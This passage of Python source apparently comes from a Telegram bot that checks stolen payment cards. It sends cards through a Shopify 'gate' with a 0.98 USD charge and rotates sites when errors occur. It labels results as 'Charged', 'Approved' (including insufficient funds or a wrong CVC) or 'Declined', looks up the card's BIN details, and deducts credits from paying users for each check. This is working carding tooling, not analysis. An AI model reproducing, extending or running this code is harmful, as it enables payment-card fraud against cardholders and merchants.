            logging.error(f"[SP] API error ({current_site}): {e}")
            api_result = {"Response": "CONNECTION_ERROR"}

        response_lower = api_result.get("Response", "").lower()
        should_rotate = any(err in response_lower for err in RETRY_ERRORS)
        if not should_rotate:
            break


    try:
        bin_info = await get_bin_info(cc[:6])
    except Exception:
        bin_info = {}

    bin_scheme = bin_info.get("scheme", "N/A")
    bin_bank = bin_info.get("bank", "N/A")
    country_name = bin_info.get("country", "N/A")
    country_flag = bin_info.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}".strip() if country_flag else country_name
    type = bin_info.get("type") or "N/A"


    response_raw = api_result.get("Response", "").upper()
    response_lower = response_raw.lower()
    is_charged_stat = False

    CHARGED_KEYWORDS = ["order_placed", "charged", "order_paid", "thank you", "thank_you"]
    APPROVED_KEYWORDS = [
        "3ds_required", "3d_authentication", "insufficient_funds",
        "invalid_cvc", "incorrect_cvc", "invalid_zip", "incorrect_zip",
    ]

    is_technical_error = (
        any(err in response_lower for err in RETRY_ERRORS)
        or "error" in response_lower
        or "timeout" in response_lower
    )

    if is_technical_error:
        final_status = "<b>Ꭼʀʀᴏʀ</b> ⚠️"
        credits_to_deduct = 0
    elif any(k in response_lower for k in CHARGED_KEYWORDS):
        final_status = f'<b>Ꮯꮋꭺꭱᏽꭼꭰ</b> <tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">🔥</tg-emoji>'
        is_charged_stat = True
        credits_to_deduct = 1
    elif any(k in response_lower for k in APPROVED_KEYWORDS):
        final_status = f'<b>Ꭺꮲꮲꭱꮎꮩꭼꭰ</b> <tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        is_charged_stat = True
        credits_to_deduct = 1
    else:
        final_status = f'<b>Ꭰᴇᴄʟɪɴᴇᴅ</b> <tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji>'
        credits_to_deduct = 1


    if credits_to_deduct > 0:
        current_credits = await asyncio.to_thread(get_user_credits, user_id)
        new_balance = max(0, current_credits - 1)
        await asyncio.to_thread(update_credits, user_id, new_balance)


    await asyncio.to_thread(update_user_stats_sync, user_id, is_charged_stat)


    user_link = build_user_link(user)
    dev_link = dev_badge()
    user_display = f"{user_link} {plan_badge(plan_name)}"

    elapsed = time.time() - check_started
    final_caption = (
    f'<tg-emoji emoji-id="5041796412954641308">💎</tg-emoji> '
    f'<b>Sᴛᴀᴛᴜs ➵ {final_status}</b> '
    f'<tg-emoji emoji-id="5041992177563993101">☄️</tg-emoji>\n'
    f'⤷ <code>{formatted_cc}</code>\n'
    f'━━━━━━━━━━━━━━━━━\n'
    f'<tg-emoji emoji-id="5444860552310457690">💰</tg-emoji> '
    f'<b>Gᴀᴛᴇ ➵ Sʜᴏᴘɪғʏ | 0.98USD</b>\n'
    f'<tg-emoji emoji-id="5447510826304959724">💬</tg-emoji> '
    f'<b>Rᴀᴡ ➵ {response_raw}</b>\n'
    f'━━━━━━━━━━━━━━━━━\n'
    f'<tg-emoji emoji-id="5447448489149625830">📡</tg-emoji> '
    f'<b>Tʏᴘᴇ ➵</b> <code>[ {type} ]</code>\n'
    f'<tg-emoji emoji-id="5447642819239903347">🎨</tg-emoji> '
    f'<b>Iɴꜰᴏ ➵</b> <code>{bin_scheme} - {bin_bank} - {bin_country}</code>\n'
    f'━━━━━━━━━━━━━━━━━\n'
    f'<tg-emoji emoji-id="5447453226498552490">💳</tg-emoji> '
    f'<b>➵ {elapsed:.2f}s</b>\n'
    f'<tg-emoji emoji-id="5445027583588593750">🌐</tg-emoji> '
    f'<b>➵ {user_display}</b>\n'
    f'━━━━━━━━━━━━━━━━━\n'
    f'<tg-emoji emoji-id="5039644681583985437">🔥</tg-emoji> '
    f'<b>Oᴡɴᴇʀ ➵ </b>{dev_link}'
    f'<tg-emoji emoji-id="5039816072253932764">💎</tg-emoji>'
)


    gif_url = await get_anime_gif()


    try:

        try:
            await proc_msg.delete()
        except Exception:
            pass


        await message.reply_animation(
            animation=gif_url,
            caption=final_caption,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:

        logging.warning(f"[SP] Could not send GIF, falling back to text: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception as edit_err:
            logging.error(f"Error editing message: {edit_err}")
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
    except Exception as e:

        logging.error(f"Error sending result: {e}")
        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            await message.reply(
                text=final_caption,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
